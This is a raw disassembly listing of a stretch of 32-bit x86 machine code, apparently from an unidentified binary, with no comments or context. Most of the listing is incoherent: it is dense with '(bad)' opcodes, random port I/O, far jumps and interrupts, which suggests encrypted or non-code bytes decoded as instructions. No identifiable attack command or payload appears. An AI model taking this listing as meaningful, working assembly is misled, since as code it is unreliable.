  42bf93:	mov    DWORD PTR [edi],0xdad500da
  42bf99:	retf   0xc5d9
  42bf9c:	clc    
  42bf9d:	adc    esi,ebp
  42bf9f:	mov    edi,0xc5e1edc3
  42bfa4:	loop   0x42bf76
  42bfa6:	mov    ah,0xce
  42bfa8:	out    dx,al
  42bfa9:	in     eax,dx
  42bfaa:	cli    
  42bfab:	jecxz  0x42bf99
  42bfad:	cmc    
  42bfae:	rol    DWORD PTR [edi],1
  42bfb0:	pop    es
  42bfb1:	aad    0x5
  42bfb3:	in     al,dx
  42bfb4:	out    0xf6,al
  42bfb6:	loope  0x42bfb2
  42bfb8:	push   cs
  42bfb9:	aad    0xa
  42bfbb:	cli    
  42bfbc:	enter  0xdce4,0xf7
  42bfc0:	jmp    0xafb7:0xedc8d4b1
  42bfc7:	in     eax,dx
  42bfc8:	ror    ch,cl
  42bfca:	lock fld1 
  42bfcd:	(bad)  
  42bfce:	cli    
  42bfcf:	aam    0xd2
  42bfd1:	repnz mov DWORD PTR [eax],0xfffd05c0
  42bfd8:	jmp    0x42bfd0
  42bfda:	enter  0xcac6,0xde
  42bfde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bfdf:	lods   al,BYTE PTR ds:[esi]
  42bfe0:	leave  
  42bfe1:	call   0xdc0a74b7
  42bfe6:	shl    DWORD PTR [esi-0x16242e09],0x2
  42bfed:	icebp  
  42bfee:	mov    eax,0xecded3f1
  42bff3:	loope  0x42bfe8
  42bff5:	loopne 0x42bfd7
  42bff7:	loope  0x42bfc3
  42bff9:	jmp    0xecdd:0xd3f8cbdd
  42c000:	shl    ebp,0xb0
  42c003:	rcl    bl,0xeb
  42c006:	rol    ebp,1
  42c008:	retf   0xcec5
  42c00b:	aad    0xce
  42c00d:	mov    al,0xfd
  42c00f:	(bad)  
  42c011:	shl    bl,cl
  42c013:	(bad)  
  42c014:	inc    ebx
  42c016:	aad    0xf4
  42c018:	std    
  42c019:	add    eax,0xf9e3e4cb
  42c01e:	jecxz  0x42bff8
  42c020:	fdiv   QWORD PTR [eax-0x4c04554d]
  42c026:	sar    dl,1
  42c028:	mov    ch,0xca
  42c02a:	mov    eax,0xc1fab8ec
  42c02f:	fidivr DWORD PTR [esi-0x3082c2b]
  42c035:	(bad)  
  42c036:	pop    es
  42c037:	add    bh,dh
  42c039:	call   0xa0cc21a
  42c03e:	loop   0x42c008
  42c040:	mov    esp,0xece2e1b0
  42c045:	lods   al,BYTE PTR ds:[esi]
  42c046:	in     eax,dx
  42c047:	loopne 0x42c01f
  42c049:	leave  
  42c04a:	(bad)  
  42c04c:	jecxz  0x42c04f
  42c04e:	stc    
  42c04f:	cmc    
  42c050:	jecxz  0x42c058
  42c052:	not    esp
  42c054:	(bad)  
  42c055:	aam    0xd7
  42c057:	out    0x1,eax
  42c059:	lds    ecx,FWORD PTR [esp+eax*1]
  42c05c:	(bad)  
  42c05d:	out    0xc0,eax
  42c05f:	mov    esi,0xb1abc4bc
  42c064:	mov    ah,0xeb
  42c066:	test   ebx,0xfeeee8d4
  42c06c:	in     al,dx
  42c06d:	in     eax,dx
  42c06e:	add    eax,ebx
  42c070:	fsubrp st(3),st
  42c072:	fprem1 
  42c074:	in     eax,0xf5
  42c076:	(bad)  
  42c077:	retf   0xc7db
  42c07a:	add    DWORD PTR [edx],ecx
  42c07c:	or     cl,dh
  42c07e:	mov    bl,0xd8
  42c080:	jmp    0x42c02a
  42c082:	in     eax,dx
  42c083:	loope  0x42c07f
  42c085:	(bad)  
  42c086:	enter  0xe4d4,0xc6
  42c08a:	leave  
  42c08b:	mov    dh,0xdf
  42c08d:	mov    eax,0xf1fc01c1
  42c092:	mov    ebx,0xfffd07ba
  42c097:	sar    bl,1
  42c099:	or     eax,0xdfacce5
  42c09e:	iret   
  42c09f:	enter  0xe1e2,0xe3
  42c0a3:	xlat   BYTE PTR ds:[ebx]
  42c0a4:	mov    ebx,0xefd4b0ec
  42c0a9:	fcmovbe st,st(1)
  42c0ab:	call   0x3fb9980
  42c0b0:	hlt    
  42c0b1:	add    ebp,edx
  42c0b3:	fscale 
  42c0b5:	fld    st(3)
  42c0b7:	in     al,0x1
  42c0b9:	out    0x9,al
  42c0bb:	loop   0x42c0bd
  42c0bd:	loopne 0x42c078
  42c0bf:	sar    DWORD PTR [esi-0x16512934],1
  42c0c5:	sar    DWORD PTR [ecx-0x31101415],cl
  42c0cb:	int    0xf8
  42c0cd:	xlat   BYTE PTR ds:[ebx]
  42c0ce:	aad    0xb6
  42c0d0:	div    esp
  42c0d2:	in     al,0x0
  42c0d4:	fadd   DWORD PTR [ebx]
  42c0d6:	shl    edi,0x5
  42c0d9:	add    eax,0xeb00ebc4
  42c0de:	shl    BYTE PTR [esi-0x2b522d24],1
  42c0e4:	enter  0xb6ba,0xbb
  42c0e8:	mov    ah,0xdd
  42c0eb:	retf   
  42c0ec:	(bad)  
  42c0ee:	fcmovnbe st,st(7)
  42c0f0:	mul    dl
  42c0f2:	repz (bad) 
  42c0f4:	xlat   BYTE PTR ds:[ebx]
  42c0f5:	jecxz  0x42c0f1
  42c0f7:	jmp    0x622abf3
  42c0fc:	or     eax,esp
  42c0fe:	mov    cl,0xc4
  42c100:	mov    ebp,0xacd6cbe1
  42c106:	out    dx,al
  42c107:	fidivr DWORD PTR [ebx-0x34111441]
  42c10d:	std    
  42c10e:	aam    0xbe
  42c110:	(bad)  
  42c112:	clc    
  42c113:	test   BYTE PTR [edx],0xcb
  42c116:	cld    
  42c117:	retf   0xe8dc
  42c11a:	jmp    0x42c124
  42c11c:	loop   0x42c0fe
  42c11e:	int    0xe1
  42c120:	call   0xf2f974fb
  42c125:	iret   
  42c126:	(bad)  
  42c127:	jmp    0x42c11d
  42c129:	out    0xb8,al
  42c12b:	mov    dl,0xf1
  42c12d:	call   0xc72995e9
  42c132:	repnz rcl ebp,cl
  42c135:	not    bh
  42c137:	loop   0x42c144
  42c139:	jecxz  0x42c116
  42c13b:	or     ecx,esi
  42c13d:	call   0xc7f2a403
  42c142:	scas   al,BYTE PTR es:[edi]
  42c143:	lock lods al,BYTE PTR ds:[esi]
  42c145:	lods   al,BYTE PTR ds:[esi]
  42c146:	shr    bh,0xcd
  42c149:	out    0xda,al
  42c14b:	mov    ebx,0xe1e1f7b8
  42c150:	cmc    
  42c151:	(bad)  
  42c152:	(bad)  
  42c154:	(bad)  
  42c155:	fiadd  WORD PTR [ebx]
  42c157:	retf   0xc4ef
  42c15a:	add    BYTE PTR [ebx],cl
  42c15c:	fprem  
  42c15e:	jecxz  0x42c133
  42c160:	out    0xc8,eax
  42c162:	jmp    0x42c115
  42c164:	(bad)
  42c167:	neg    ecx
  42c169:	iret   
  42c16a:	icebp  
  42c16b:	(bad)  
  42c16c:	repz retf 0xf5d9
  42c170:	(bad)  
  42c171:	in     eax,0xc7
  42c173:	add    ebx,edx
  42c175:	(bad)
  42c178:	in     al,0xfb
  42c17a:	out    dx,al
  42c17b:	add    al,0x7
  42c17d:	out    dx,eax
  42c17e:	int    0xe6
  42c180:	lods   eax,DWORD PTR ds:[esi]
  42c181:	idiv   DWORD PTR [ebp+ebp*8-0x150b4b0c]
  42c188:	fdivp  st(7),st
  42c18a:	test   ecx,0xd4e1caba
  42c190:	(bad)  
  42c191:	test   dh,0x3
  42c194:	jmp    0xe5c9:0xdbe0e6d1
  42c19b:	loop   0x42c184
  42c19d:	in     al,dx
  42c19e:	fnstcw WORD PTR [ebp+eax*8-0x3d3e3b23]
  42c1a5:	test   ebp,0xffddb4b9
  42c1ab:	call   0xff12b585
  42c1b0:	int    0xbd
  42c1b2:	mov    esi,0xc2f1f5f6
  42c1b7:	in     eax,0xe1
  42c1b9:	(bad)  
  42c1ba:	jmp    0xb7c4:0xc4ede504
  42c1c1:	lods   al,BYTE PTR ds:[esi]
  42c1c2:	cmc    
  42c1c3:	shl    ecx,1
  42c1c5:	int3   
  42c1c6:	mov    ch,0xd3
  42c1c8:	shr    esi,cl
  42c1ca:	call   0xbe3d7789
  42c1cf:	call   0xf61389cc
  42c1d4:	(bad)  
  42c1d5:	(bad)  
  42c1d6:	(bad)  
  42c1d7:	sti    
  42c1d8:	pavgb  mm1,QWORD PTR [edi]
  42c1db:	add    edi,ebp
  42c1dd:	adc    DWORD PTR [ebx-0x1a43194f],esi
  42c1e3:	jmp    0xb128a8bf
  42c1e8:	lods   eax,DWORD PTR ds:[esi]
  42c1e9:	fnsave [esi-0x1035fc27]
  42c1ef:	rol    DWORD PTR [ebx],1
  42c1f1:	shl    dl,1
  42c1f3:	repnz sti 
  42c1f5:	(bad)  
  42c1f7:	cli    
  42c1f8:	out    dx,eax
  42c1f9:	add    al,0xd9
  42c1fb:	in     al,0xef
  42c1fd:	repnz mov cl,0xce
  42c200:	loope  0x42c1c5
  42c202:	mov    ch,0xf6
  42c204:	into   
  42c205:	in     eax,dx
  42c206:	out    dx,eax
  42c207:	mov    edx,0xebe5fbe7
  42c20c:	rcr    edi,1
  42c20e:	rcl    esi,cl
  42c210:	mov    edi,0xc5c5f0fc
  42c215:	or     eax,edi
  42c217:	aad    0xe2
  42c219:	(bad)
  42c21c:	pop    es
  42c21d:	enter  0xc4af,0xf3
  42c221:	imul   BYTE PTR [edi-0x4632154a]
  42c227:	out    dx,eax
  42c228:	mov    ch,0xfe
  42c22a:	cmc    
  42c22b:	mov    ah,0x3
  42c22d:	retf   0xb6b9
  42c230:	add    bh,BYTE PTR [edi+0x1c4e3da]
  42c236:	aad    0x0
  42c238:	or     esi,edx
  42c23a:	(bad)
  42c23d:	int    0xc4
  42c23f:	mov    esp,0xd4c8d0a8
  42c244:	repz int 0xf0
  42c247:	(bad)  
  42c248:	cmc    
  42c249:	enter  0xd3ef,0xd2
  42c24d:	mov    edx,0x6bfc1e0
  42c252:	push   es
  42c253:	mov    esi,0xea07e4e2
  42c258:	jecxz  0x42c21a
  42c25a:	jecxz  0x42c258
  42c25c:	enter  0xd0c4,0xe4
  42c260:	iret   
  42c261:	xlat   BYTE PTR ds:[ebx]
  42c262:	(bad)
  42c265:	xlat   BYTE PTR ds:[ebx]
  42c266:	jmp    0x42c25e
  42c268:	(bad)
  42c26b:	mov    eax,0xdacfefdf
  42c270:	fnstcw WORD PTR [edx+eiz*8-0x60d0f42]
  42c277:	sti    
  42c278:	out    dx,al
  42c279:	fisttp WORD PTR [ecx]
  42c27b:	fadd   st,st(5)
  42c27d:	loopne 0x42c248
  42c27f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c280:	icebp  
  42c281:	rol    dh,0xec
  42c284:	mov    bh,0xd9
  42c286:	aam    0xee
  42c288:	shr    ecx,cl
  42c28a:	in     eax,0xdb
  42c28c:	sar    DWORD PTR [edx-0x2e113f25],1
  42c292:	out    0xb,eax
  42c294:	add    eax,DWORD PTR [esi+ebx*8]
  42c297:	call   0xe34bcb72
  42c29c:	or     ch,dl
  42c29e:	jecxz  0x42c26d
  42c2a0:	loopne 0x42c291
  42c2a2:	(bad)  
  42c2a3:	(bad)  
  42c2a4:	jecxz  0x42c29c
  42c2a6:	int    0xb9
  42c2a8:	fnstcw WORD PTR [ebx-0x2007082b]
  42c2ae:	mov    ebp,0xd2b4c0f5
  42c2b3:	inc    ah
  42c2b5:	in     al,0xda
  42c2b7:	rcr    bh,1
  42c2b9:	fld    QWORD PTR ds:0xbf0cfc0c
  42c2bf:	icebp  
  42c2c0:	ret    0xb5b3
  42c2c3:	retf   0xe8a9
  42c2c6:	shl    ch,cl
  42c2c8:	into   
  42c2c9:	mov    ch,0xd4
  42c2cb:	clc    
  42c2cc:	mov    ah,0xbd
  42c2ce:	sti    
  42c2cf:	lock add eax,edi
  42c2d2:	mov    esi,0xc605dd0b
  42c2d7:	shl    al,0x0
  42c2da:	int    0xe
  42c2dc:	or     ecx,ebx
  42c2de:	jmp    0xb305b9d0
  42c2e3:	jmp    0xd4ce:0xd4f5b5e8
  42c2ea:	sar    cl,1
  42c2ec:	mov    ebx,0xe2dfecec
  42c2f1:	mov    ah,0xf7
  42c2f3:	jecxz  0x42c2bb
  42c2f5:	idiv   edi
  42c2f7:	loope  0x42c2d1
  42c2f9:	in     al,0xfe
  42c2fb:	or     esp,edx
  42c2fd:	(bad)  
  42c2fe:	fsub   st,st(0)
  42c300:	mov    bh,0xf5
  42c302:	mov    dh,0xeb
  42c304:	(bad)  
  42c305:	sar    DWORD PTR [edx-0x482c3a21],cl
  42c30b:	repz mov cl,0xbb
  42c30e:	int    0xde
  42c310:	ret    
  42c311:	fucom  st(5)
  42c313:	add    ebx,ecx
  42c315:	or     eax,esp
  42c317:	test   BYTE PTR [edi],0xf5
  42c31a:	iret   
  42c31b:	std    
  42c31c:	out    dx,al
  42c31d:	inc    ebp
  42c31f:	loope  0x42c318
  42c321:	mov    esp,0xf4c7d7bc
  42c326:	shr    ah,1
  42c328:	xlat   BYTE PTR ds:[ebx]
  42c329:	fmul   st,st(6)
  42c32b:	mov    edx,0xc0b9f0d1
  42c330:	int    0xc6
  42c332:	add    ah,bh
  42c334:	test   edx,0xebe4e0dd
  42c33a:	fsubr  st(0),st
  42c33c:	jecxz  0x42c32b
  42c33e:	call   0xf7208aeb
  42c343:	call   0xb211b92e
  42c348:	enter  0xcfba,0xb2
  42c34c:	sti    
  42c34d:	aad    0xf6
  42c34f:	fsin   
  42c351:	stc    
  42c352:	ret    
  42c353:	rol    dh,0xd6
  42c356:	out    0xe3,al
  42c358:	xlat   BYTE PTR ds:[ebx]
  42c359:	sti    
  42c35a:	push   es
  42c35b:	fprem  
  42c35d:	add    ah,BYTE PTR [edi-0x394f2933]
  42c363:	jmp    0xd52b7733
  42c368:	lods   eax,DWORD PTR ds:[esi]
  42c369:	mov    edx,0xcecdd1f8
  42c36e:	aam    0xcc
  42c370:	fidivr DWORD PTR [edi-0x3a2b2109]
  42c376:	(bad)  
  42c377:	cli    
  42c378:	aam    0xbc
  42c37a:	loope  0x42c376
  42c37c:	fsub   st(7),st
  42c37e:	stos   DWORD PTR es:[edi],eax
  42c37f:	(bad)  
  42c381:	imul   BYTE PTR [esi-0x4a120f2d]
  42c387:	mov    ch,0xc5
  42c389:	clc    
  42c38a:	mov    ah,0xd5
  42c38c:	hlt    
  42c38d:	(bad)  
  42c38f:	in     eax,dx
  42c390:	fstp   st(1)
  42c392:	div    ecx
  42c394:	fiadd  DWORD PTR [edi]
  42c396:	shl    edi,1
  42c398:	jmp    0x42c369
  42c39a:	out    0xe0,al
  42c39c:	or     DWORD PTR [eax],ecx
  42c39e:	retf   0xe2f2
  42c3a1:	mov    cl,0xb2
  42c3a3:	mov    dh,0xc7
  42c3a5:	shl    al,1
  42c3a7:	repz (bad) 
  42c3a9:	retf   
  42c3aa:	rcr    esp,cl
  42c3ac:	mov    edx,0xe3f5d6b9
  42c3b1:	rcl    ah,1
  42c3b3:	add    edx,esi
  42c3b5:	(bad)  
  42c3b6:	fcmovnb st,st(6)
  42c3b8:	jmp    0x42c3bd
  42c3ba:	out    0x8,al
  42c3bc:	std    
  42c3bd:	in     eax,0xbf
  42c3bf:	jmp    0xf9c3:0xebc4b3e9
  42c3c6:	(bad)  
  42c3c7:	icebp  
  42c3c8:	clc    
  42c3c9:	rcl    esp,1
  42c3cb:	jmp    0x42c396
  42c3cd:	into   
  42c3ce:	shl    dl,cl
  42c3d0:	ret    
  42c3d1:	fcom   st(5)
  42c3d3:	mov    esp,0xdd01ebc0
  42c3d8:	fdivr  st,st(3)
  42c3da:	fcmovne st,st(1)
  42c3dc:	(bad)  
  42c3dd:	faddp  st(0),st
  42c3df:	jmp    0xd327a7a9
  42c3e4:	mov    bl,0xf7
  42c3e6:	in     al,dx
  42c3e7:	mov    ch,0xd3
  42c3e9:	cli    
  42c3ea:	vpsrld xmm4,xmm5,xmm1
  42c3ee:	sti    
  42c3ef:	out    dx,al
  42c3f0:	out    0xe7,al
  42c3f2:	ret    
  42c3f3:	sar    ebp,0x0
  42c3f6:	add    DWORD PTR [eax],ecx
  42c3f8:	div    dh
  42c3fa:	or     ah,dh
  42c3fc:	fucomip st,st(2)
  42c3fe:	mov    esi,0xf1d7efac
  42c403:	lods   al,BYTE PTR ds:[esi]
  42c404:	cli    
  42c405:	loope  0x42c3f8
  42c407:	(bad)  
  42c408:	leave  
  42c409:	les    esi,FWORD PTR [edi+0x2d3ead7]
  42c40f:	ret    
  42c410:	mov    ebp,0xf2f8f5e1
  42c415:	aam    0x2
  42c417:	loope  0x42c3f9
  42c419:	les    eax,FWORD PTR [ebx]
  42c41b:	or     eax,0xbef2c4db
  42c420:	retf   0xf0ed
  42c423:	(bad)  
  42c424:	shr    ch,cl
  42c426:	into   
  42c427:	clc    
  42c428:	repnz out dx,al
  42c42a:	leave  
  42c42b:	aam    0xd5
  42c42d:	sti    
  42c42e:	sti    
  42c42f:	iret   
  42c430:	rcr    cl,0x3
  42c433:	aad    0xd9
  42c435:	cmc    
  42c436:	retf   0x2e2
  42c439:	enter  0xfceb,0xf3
  42c43d:	int3   
  42c43e:	test   al,0xc2
  42c440:	iret   
  42c441:	mov    cl,0xdd
  42c443:	out    dx,al
  42c444:	(bad)  
  42c445:	lock cmc 
  42c447:	out    0xee,eax
  42c449:	fmul   st,st(5)
  42c44b:	out    dx,al
  42c44c:	aad    0xd8
  42c44e:	add    cl,al
  42c450:	(bad)  
  42c451:	int    0x1
  42c453:	int3   
  42c454:	(bad)
  42c458:	fsub   st(2),st
  42c45a:	out    dx,al
  42c45b:	int3   
  42c45c:	enter  0xe3df,0xf0
  42c460:	shl    DWORD PTR [esi-0x10390d54],0xeb
  42c467:	mov    eax,0x3d1f4d8
  42c46c:	mov    esp,0xdabfb9d7
  42c471:	in     eax,0xf3
  42c473:	(bad)  
  42c474:	loop   0x42c473
  42c476:	icebp  
  42c477:	shl    esi,0xd4
  42c47a:	(bad)  
  42c47b:	cli    
  42c47c:	jmp    0xcd03b345
  42c481:	icebp  
  42c482:	in     eax,dx
  42c483:	out    dx,al
  42c484:	into   
  42c485:	rcr    cl,0xf6
  42c488:	jmp    0xcfee:0xbcfbd7fd
  42c48f:	sti    
  42c490:	aad    0xd8
  42c492:	(bad)  
  42c493:	add    ch,bl
  42c495:	lock cmc 
  42c497:	in     eax,0xe2
  42c499:	leave  
  42c49a:	fnstsw ax
  42c49c:	jmp    0x42c4ad
  42c49e:	(bad)  
  42c4a0:	ret    
  42c4a1:	repz icebp 
  42c4a3:	lock (bad) 
  42c4a5:	jmp    0xe3bf:0xd4d3d4ba
  42c4ac:	icebp  
  42c4ad:	jmp    0xd4007e88
  42c4b2:	clc    
  42c4b3:	les    eax,FWORD PTR [ecx]
  42c4b5:	or     dh,ch
  42c4b7:	aad    0x3
  42c4b9:	cli    
  42c4ba:	push   cs
  42c4bb:	in     eax,dx
  42c4bc:	out    0xe4,al
  42c4be:	shr    cl,1
  42c4c0:	shr    DWORD PTR [eax-0xc183413],0xb5
  42c4c7:	fcom   st(0)
  42c4c9:	in     eax,dx
  42c4ca:	mov    bh,0xfb
  42c4cc:	div    BYTE PTR [eax-0x1d29212e]
  42c4d2:	(bad)  
  42c4d3:	hlt    
  42c4d4:	(bad)  
  42c4d6:	clc    
  42c4d7:	add    bh,bh
  42c4d9:	or     eax,0xc4e60cfb
  42c4de:	test   eax,0xf1e3cbcf
  42c4e3:	out    dx,al
  42c4e4:	loopne 0x42c4b1
  42c4e6:	out    dx,eax
  42c4e7:	(bad)  
  42c4e8:	(bad)  
  42c4e9:	mov    ch,0xd6
  42c4eb:	hlt    
  42c4ec:	fcmovu st,st(3)
  42c4ee:	fsubrp st(2),st
  42c4f0:	iret   
  42c4f1:	icebp  
  42c4f2:	mov    edi,0xe40304c3
  42c4f7:	xbegin 0xc0ecbe4
  42c4fd:	fisub  WORD PTR [edi-0x1943501d]
  42c503:	cmc    
  42c504:	ror    ecx,cl
  42c506:	leave  
  42c507:	sar    ebx,1
  42c509:	fcmovbe st,st(6)
  42c50b:	(bad)  
  42c50d:	sar    DWORD PTR [eax+0x30602f3],1
  42c513:	out    0xb,al
  42c515:	pop    es
  42c516:	or     al,dl
  42c518:	enter  0xd9e3,0xde
  42c51c:	cld    
  42c51d:	jmp    0xe61496f2
  42c522:	iret   
  42c523:	imul   dl
  42c525:	in     al,dx
  42c526:	out    0xd7,eax
  42c528:	mov    eax,0xf5fbb9d1
  42c52d:	mov    ebx,0xd5f6f2f1
  42c532:	add    eax,0xf0bcdbc3
  42c537:	jmp    0xc551d347
  42c53c:	out    0x8,eax
  42c53e:	in     al,dx
  42c53f:	ffree  st(2)
  42c541:	(bad)  
  42c542:	scas   al,BYTE PTR es:[edi]
  42c543:	int3   
  42c544:	retf   0xbaf3
  42c547:	scas   al,BYTE PTR es:[edi]
  42c548:	lock mov esi,0xd7cef4ef
  42c54e:	cmc    
  42c54f:	fcomi  st,st(3)
  42c551:	(bad)  
  42c552:	fadd   QWORD PTR [eax]
  42c554:	rcl    eax,0xff
  42c557:	or     bl,bl
  42c559:	fcmove st,st(5)
  42c55b:	or     al,0xf9
  42c55d:	repz fldcw WORD PTR [ebp-0x2c3c323d]
  42c564:	mov    dl,0xf6
  42c566:	int3   
  42c567:	xlat   BYTE PTR ds:[ebx]
  42c568:	retf   0xc4eb
  42c56b:	iret   
  42c56c:	sti    
  42c56d:	int3   
  42c56e:	(bad)  
  42c570:	aad    0xf3
  42c572:	(bad)  
  42c574:	std    
  42c575:	(bad)  
  42c577:	add    esp,esp
  42c579:	pop    es
  42c57a:	(bad)  
  42c57c:	rcr    edx,0xcf
  42c57f:	in     al,dx
  42c580:	ret    0xe6e3
  42c583:	scas   al,BYTE PTR es:[edi]
  42c584:	rcl    esi,0xfb
  42c587:	jmp    0x42c574
  42c589:	leave  
  42c58a:	icebp  
  42c58b:	fcomi  st,st(0)
  42c58d:	stc    
  42c58e:	mov    edi,0xd803e0e7
  42c593:	mov    esi,0xe1c3e504
  42c598:	paddd  mm1,mm7
  42c59b:	(bad)  
  42c59d:	jmp    0xefce:0xc6ace1ed
  42c5a4:	test   eax,0xccedcccd
  42c5a9:	repnz into 
  42c5ab:	fdivr  st(3),st
  42c5ad:	mov    ebp,0xbcc3d0d9
  42c5b2:	cld    
  42c5b3:	add    eax,0xdee700fa
  42c5b8:	fucom  st(1)
  42c5ba:	cli    
  42c5bb:	enter  0xfe12,0xad
  42c5bf:	leave  
  42c5c0:	jmp    0x42c59f
  42c5c2:	test   ah,0xef
  42c5c5:	repnz iret 
  42c5c7:	cmc    
  42c5c8:	retf   0xbefd
  42c5cb:	shl    dh,1
  42c5cd:	mov    esp,0xcecdbce8
  42c5d2:	test   BYTE PTR [eax],0xd2
  42c5d5:	loop   0x42c5b3
  42c5d7:	add    BYTE PTR [ebx],al
  42c5d9:	jmp    0x42c5df
  42c5db:	enter  0x506,0xa9
  42c5df:	loope  0x42c5c9
  42c5e1:	ret    
  42c5e2:	ret    
  42c5e3:	mov    bh,0xad
  42c5e5:	loop   0x42c59a
  42c5e7:	mov    ecx,0xfdc8f1d5
  42c5ec:	jmp    0xd4cc:0xd8b6f4de
  42c5f3:	rcr    bh,0xc2
  42c5f6:	jmp    0x42c5e2
  42c5f8:	loopne 0x42c5fb
  42c5fa:	fmul   st,st(3)
  42c5fc:	or     ah,bh
  42c5fe:	mov    esp,0xfbcab3dc
  42c604:	lock out 0xda,al
  42c607:	clc    
  42c608:	repnz in eax,dx
  42c60a:	fcomip st,st(6)
  42c60c:	enter  0xedfe,0x7
  42c610:	shl    eax,cl
  42c612:	fmul   st,st(4)
  42c614:	loope  0x42c5ee
  42c616:	in     al,0xe8
  42c618:	jmp    0x42c5e2
  42c61a:	or     bl,cl
  42c61c:	sti    
  42c61d:	bnd jmp 0xe32c830c
  42c623:	mov    ah,0xfa
  42c625:	jmp    0x42c601
  42c627:	push   ebp
  42c629:	enter  0xbab6,0xdf
  42c62d:	into   
  42c62e:	shr    esi,1
  42c630:	add    esi,ebp
  42c632:	add    bh,ch
  42c634:	in     al,0xde
  42c636:	xlat   BYTE PTR ds:[ebx]
  42c637:	loope  0x42c628
  42c639:	(bad)
  42c63c:	int    0x1
  42c63e:	jmp    0xd0f2:0xb5c6d2cf
  42c645:	out    0xe9,eax
  42c647:	repz jmp 0xc8d9:0xbbdadff1
  42c64f:	loop   0x42c646
  42c651:	fcomp  st(2)
  42c653:	add    eax,0xc9fc03f4
  42c658:	add    DWORD PTR [edi],eax
  42c65a:	or     eax,0xbdf9dded
  42c65f:	loope  0x42c60f
  42c661:	shl    ah,1
  42c663:	mov    dh,0xcc
  42c665:	out    dx,eax
  42c666:	mov    al,0xe9
  42c668:	clc    
  42c669:	cli    
  42c66a:	mov    edi,0xe9bcc3eb
  42c66f:	add    DWORD PTR [edi-0xa082a43],edi
  42c675:	(bad)  
  42c676:	mul    cl
  42c678:	out    0xce,al
  42c67a:	(bad)  
  42c67c:	or     ch,ch
  42c67e:	into   
  42c67f:	lock in al,0xd2
  42c682:	jmp    0xaff7974d
  42c687:	mov    edx,0xb5f3c8cc
  42c68c:	in     eax,dx
  42c68d:	idiv   bh
  42c68f:	iret   
  42c690:	cli    
  42c691:	mov    ah,0xe0
  42c693:	clc    
  42c694:	or     dl,dl
  42c696:	fdivrp st(7),st
  42c698:	(bad)  
  42c69a:	add    ebp,ebx
  42c69c:	loop   0x42c689
  42c69e:	retf   0xb7f7
  42c6a1:	div    eax
  42c6a3:	lods   eax,DWORD PTR ds:[esi]
  42c6a4:	jmp    0xe034bb5d
  42c6a9:	repnz repnz (bad) 
  42c6ad:	jmp    0xc6ff:0xc0c2efbe
  42c6b4:	in     al,0xe6
  42c6b6:	(bad)  
  42c6b7:	cld    
  42c6b8:	add    al,0xfe
  42c6ba:	out    dx,al
  42c6bb:	iret   
  42c6bc:	add    bl,ch
  42c6be:	shr    esp,cl
  42c6c0:	retf   
  42c6c1:	in     al,dx
  42c6c2:	retf   
  42c6c3:	jecxz  0x42c689
  42c6c5:	iret   
  42c6c6:	(bad)  
  42c6c8:	xlat   BYTE PTR ds:[ebx]
  42c6c9:	stc    
  42c6ca:	fcomi  st,st(1)
  42c6cc:	ret    
  42c6cd:	fldz   
  42c6cf:	test   bh,0xe7
  42c6d2:	(bad)  
  42c6d3:	fabs   
  42c6d5:	fcmovnbe st,st(0)
  42c6d7:	aam    0xeb
  42c6d9:	out    0xef,al
  42c6db:	loope  0x42c6b9
  42c6dd:	adc    dl,al
  42c6df:	leave  
  42c6e0:	scas   al,BYTE PTR es:[edi]
  42c6e1:	lods   al,BYTE PTR ds:[esi]
  42c6e2:	out    0xc4,eax
  42c6e4:	retf   
  42c6e5:	xlat   BYTE PTR ds:[ebx]
  42c6e6:	int    0xe9
  42c6e8:	(bad)  
  42c6ea:	dec    esp
  42c6ec:	cmc    
  42c6ed:	mov    edx,0xeeedf2db
  42c6f2:	sar    ecx,1
  42c6f4:	ret    
  42c6f5:	shr    eax,0xfd
  42c6f8:	fdivp  st(6),st
  42c6fa:	int    0xf4
  42c6fc:	add    al,0xcc
  42c6fe:	bnd ret 0xd6cc
  42c702:	xlat   BYTE PTR ds:[ebx]
  42c703:	rol    eax,0xd0
  42c706:	out    0xf1,eax
  42c708:	(bad)  
  42c709:	push   DWORD PTR [eax+edi*8-0x3e0f4424]
  42c710:	mov    esi,0xf4c7d2cc
  42c715:	icebp  
  42c716:	add    eax,esp
  42c718:	pop    es
  42c719:	push   es
  42c71a:	ret    
  42c71b:	jmp    0xc7ffd900
  42c720:	imul   ah
  42c722:	in     al,dx
  42c723:	repz leave 
  42c725:	mov    edx,0xb5cfd0f4
  42c72a:	idiv   dh
  42c72c:	add    ebp,esp
  42c72e:	rol    eax,1
  42c730:	icebp  
  42c731:	(bad)  
  42c733:	(bad)  
  42c734:	clc    
  42c735:	sar    ch,0xdc
  42c738:	clc    
  42c739:	loope  0x42c71b
  42c73b:	jmp    0xd0d0:0xa6accafe
  42c742:	scas   al,BYTE PTR es:[edi]
  42c743:	div    BYTE PTR [ebp-0x132b4e45]
  42c749:	retf   0xf6fa
  42c74c:	mov    ecx,0xedf4f6de
  42c751:	loopne 0x42c731
  42c753:	loopne 0x42c73a
  42c755:	(bad)  
  42c756:	or     ebx,esp
  42c758:	out    0xf8,al
  42c75a:	paddq  mm6,mm2
  42c75d:	push   es
  42c75e:	jmp    0xc9d3:0xb1c9cbc5
  42c765:	mov    edx,0xb9c6d6b7
  42c76a:	fsubp  st(6),st
  42c76c:	mov    cl,0xdc
  42c76e:	add    ecx,eax
  42c770:	pop    es
  42c771:	mov    edi,0x9f3d5fb
  42c776:	(bad)  
  42c778:	(bad)  
  42c77a:	push   cs
  42c77b:	pminub mm7,mm6
  42c77e:	stos   DWORD PTR es:[edi],eax
  42c77f:	scas   al,BYTE PTR es:[edi]
  42c780:	in     eax,0xc8
  42c782:	int3   
  42c783:	cmc    
  42c784:	mov    al,0xd9
  42c786:	(bad)  
  42c787:	in     al,0xea
  42c789:	stc    
  42c78a:	clc    
  42c78b:	mov    ebp,0xd1bbbdec
  42c790:	mov    eax,0xe6e1e2d9
  42c795:	add    ah,dl
  42c797:	(bad)  
  42c798:	(bad)  
  42c799:	mov    esp,0xe6e305f8
  42c79e:	mov    bl,0xcb
  42c7a0:	loope  0x42c753
  42c7a2:	mov    dl,0xd5
  42c7a4:	mov    bh,0xe5
  42c7a6:	fcmovnbe st,st(7)
  42c7a8:	leave  
  42c7a9:	int3   
  42c7aa:	cmc    
  42c7ab:	sti    
  42c7ac:	fcomi  st,st(1)
  42c7ae:	iret   
  42c7af:	fcmovnbe st,st(5)
  42c7b1:	push   es
  42c7b2:	mov    ebp,0x806e0bd
  42c7b7:	fsubr  st(3),st
